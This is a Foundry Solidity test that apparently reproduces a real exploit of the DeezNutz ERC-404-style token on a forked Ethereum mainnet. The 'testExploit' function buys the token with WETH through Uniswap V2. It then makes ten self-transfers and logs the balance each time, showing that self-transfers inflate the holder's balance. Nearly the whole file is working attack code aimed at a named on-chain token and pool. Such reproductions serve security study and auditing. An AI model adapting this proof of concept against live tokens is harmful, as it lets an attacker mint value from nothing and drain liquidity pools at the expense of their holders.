// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IWETH9.sol";
import "@interface/IERC20.sol";
import "@interface/IUniswapV2.sol";

IBalancerVault constant vault = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IERC20 constant DeezNutz = IERC20(0xb57E874082417b66877429481473CF9FCd8e0b8a); // 404 token can be regarded as erc20
IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(
    payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
);

IUniswapV2Pair constant DeezNutz_WETH_Pool = IUniswapV2Pair(
    0x1fB4904b26DE8C043959201A63b4b23C414251E2
);

contract DeezNutzTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19277802);
        deal(address(WETH), address(this), 1 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        WETH.approve(address(UNISWAP_V2_ROUTER), type(uint).max);
        DeezNutz.approve(address(UNISWAP_V2_ROUTER), type(uint).max);

        token2token(
            address(WETH),
            address(DeezNutz),
            WETH.balanceOf(address(this))
        );
        print("DeezNutz amount", DeezNutz.balanceOf(address(this)), 18);

        for (uint x = 0; x < 10; x++) {
            DeezNutz.transfer(address(this), DeezNutz.balanceOf(address(this)));
            print(
                "self transfer, DeezNutz amount",
                DeezNutz.balanceOf(address(this)),
                18
            );
        }
    }

    function token2token(
        address token1,
        address token2,
        uint256 amount
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);

        // UNISWAP_V2_ROUTER.swapExactTokensForTokens
        UNISWAP_V2_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }
}
